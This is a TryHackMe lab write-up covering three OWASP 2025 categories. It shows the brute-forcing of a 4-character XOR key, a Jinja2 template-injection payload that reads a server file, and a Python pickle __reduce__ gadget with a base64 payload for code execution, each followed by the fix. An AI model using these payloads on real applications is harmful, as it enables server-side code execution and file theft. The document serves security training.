# OWASP Top 10 2025: Insecure Data Handling (TryHackMe)

- **Path:** Jr Penetration Tester - module "OWASP Top 10 (2025)".
- **Room:** OWASP Top 10 2025: Insecure Data Handling (beginner, ~30 min).
- **Date:** 2026-10-13.
- **Target:** `<ip>` (THM VPN; practicals on ports 8000-8002).
- **Status:** SOLVED. All 3 flags captured live from own Windows PC over the VPN
  (Python `urllib` client).
- **Scope:** three categories relating to application behaviour and user input:
  A04 Cryptographic Failures, A05 Injection, A08 Software or Data Integrity Failures.

## Flags

| Task | Category | Port | Flag |
|---|---|---|---|
| 2 | A04 Cryptographic Failures | 8001 | `THM{…}` |
| 3 | A05 Injection (SSTI) | 8000 | `THM{…}` |
| 4 | A08 Software/Data Integrity Failures | 8002 | `THM{…}` |

Note: ports 8000 and 8001 were still booting on first contact (connection refused) while 8002 was
already up; retry after a minute if a port refuses.

## A04 Cryptographic Failures (Task 2, port 8001)

"Crypto Lab: Weak XOR Cipher." Three notes are base64-encoded and encrypted with the same homemade
XOR cipher using one 4-character key. The page gives a hint: first three key chars are `KEY`, only
the 4th is unknown (the displayed `KEY_` uses `_` as the placeholder for the missing char - the key
is 4 chars total, not 5).

Brute-forcing the 4th char over `[A-Za-z0-9]` and keeping the key that decrypts all three notes to
clean ASCII: the key is **`KEY1`**.

```python
import base64
notes = [ "BiA8RSIrPhE4JjFU...", "GyQqQjwqK1Vr...", "GAAaYw4RYxEf..." ]   # from the page
def xor(d, k): return bytes(d[i] ^ ord(k[i % len(k)]) for i in range(len(d)))
for r in notes:
    print(xor(base64.b64decode(r), "KEY1").decode())
```

Decrypted notes:

```
1: Meeting scheduled for tomorrow at 3 PM. Conference room B.
2: Password reset link: https://internal.thm/reset?token=<redacted-secret>
3: SECRET: THM{…} - Do not share this with unauthorized personnel.
```

**Flag:** `THM{…}`. Rolling your own XOR with a tiny key is trivially brute-forced;
the whole keyspace here was 62 candidates. Use vetted AES-256-GCM with real key management.

## A05 Injection - SSTI (Task 3, port 8000)

"Injection Showcase." The app renders raw user input through Jinja2 `render_template_string`, so
submitted template expressions execute server-side. A decoy `THM{…}` is
printed on the page to mislead.

- Confirm execution: `{{ 7 * 7 }}` -> `49`.
- Read the flag (`flag.txt` sits next to the app):

```
{{ request.application.__globals__.__builtins__.open('flag.txt').read() }}
```

Submitted as the `payload` form field (POST to `/`). `request.application` reaches Flask
internals, which exposes `__builtins__`, giving `open()`.

**Flag:** `THM{…}`. The fix is to never feed untrusted input into
`render_template_string`; separate templates from user data and sandbox the engine.

## A08 Software or Data Integrity Failures (Task 4, port 8002)

"Integrity Lab: Insecure Deserialization." The app accepts a base64 `pickle_data` field and calls
`pickle.loads` with no signature or integrity check. Python's `pickle` runs the object's
`__reduce__` during deserialization, which is arbitrary code execution.

```python
import pickle, base64
class M:
    def __reduce__(self):
        return (eval, ("open('flag.txt').read()",))
print(base64.b64encode(pickle.dumps(M())).decode())
# gASVMwAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIwXb3BlbignZmxhZy50eHQnKS5yZWFkKCmUhZRSlC4=
```

POST that base64 as `pickle_data` to `/`; the app deserializes it, `eval("open('flag.txt').read()")`
runs, and the file contents appear in the rendered result.

**Flag:** `THM{…}`. Integrity failure: untrusted serialized data is trusted
and executed. Fix with safe formats (JSON, `yaml.safe_load`), signature verification, restricted
unpicklers, or simply never deserializing untrusted input.

## Lessons learned

- **A04:** homegrown crypto with a short key is not encryption; a 4-char key is a 62-candidate
  brute force. The XOR plaintext also leaked a second secret (an internal password-reset token).
- **A05:** SSTI turns a template engine into a code-execution sink. `request.application`
  (or `request`, `config`, `cycler`, `lipsum`) is the usual pivot to `__builtins__` and `open()`.
  Watch for decoy flags planted on the page.
- **A08:** `pickle.loads` on attacker data is RCE by design via `__reduce__`; no exploit cleverness
  needed beyond a one-line gadget.
- All three are "insecure data handling": the app trusts data (ciphertext, template input,
  serialized objects) it should treat as untrusted and verify.

## Status

Room complete, all three flags captured. This is the third room in the OWASP Top 10 (2025) module,
alongside [owasp-2025-iaaa-failures](owasp-2025-iaaa-failures.md) and
[owasp-2025-application-design-flaws](owasp-2025-application-design-flaws.md).
